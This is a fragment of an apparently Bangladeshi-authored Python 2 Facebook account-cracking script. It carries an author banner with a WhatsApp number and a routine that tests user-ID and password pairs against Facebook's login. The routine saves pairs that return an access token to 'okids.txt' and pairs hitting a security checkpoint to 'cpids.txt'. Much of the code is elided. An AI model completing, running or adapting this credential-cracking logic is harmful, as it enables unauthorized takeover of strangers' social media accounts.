...
#Script Edited By @MAJHARULISLSMTUTUL
#Utf-8 python 
...
\n\033[0m-----------------------------------------------------------------------
\033[1;92mAuthor \033[1;93m: Majharul Islam Tutul 
\033[1;92mWhatsapp \033[1;93m: +8801306684592
\033[1;92mFacebook \033[1;93m: Majharul Islam Tutul
...
def log_sel():
    ...
    if select == '1':
        ...
        os.system('xdg-open https://m.youtube.com/channel/UCVbxJH4wuk90l88rcNI27Pw')
        main()
    else:
        print ''
...
def crack_select():
    ...
    def main(arg):
        ...
        try:
            ...
            q = json.loads(data)
            if 'access_token' in q:
                print '\x1b[1;32m[SABBIR-OK]\033[0m ' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ok = open('okids.txt', 'a')
                ok.write(uid + '|' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;31m[SABBIR-CP] \033[0m' + uid + ' | ' + pass1 + '\x1b[0;97m'
                cp = open('cpids.txt', 'a')
                cp.write(uid + '|' + pass1 + '\n')
                cp.close()
